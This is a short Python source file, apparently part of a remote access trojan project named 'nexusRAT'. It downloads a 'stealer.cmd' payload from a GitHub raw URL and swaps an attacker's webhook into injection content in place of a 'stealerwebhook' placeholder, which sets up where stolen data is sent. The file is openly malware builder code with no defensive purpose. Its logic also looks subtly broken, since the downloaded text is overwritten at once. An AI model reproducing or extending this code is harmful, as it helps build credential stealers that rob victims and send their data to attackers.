import requests
import os
from setting import *

stealerurl = "https://raw.githubusercontent.com/hai723/nexusRAT/main/scr/stealer.cmd"
stealer = requests.get(stealerurl).text
stealer = inj3c710n_cont.replace("stealerwebhook", hook)
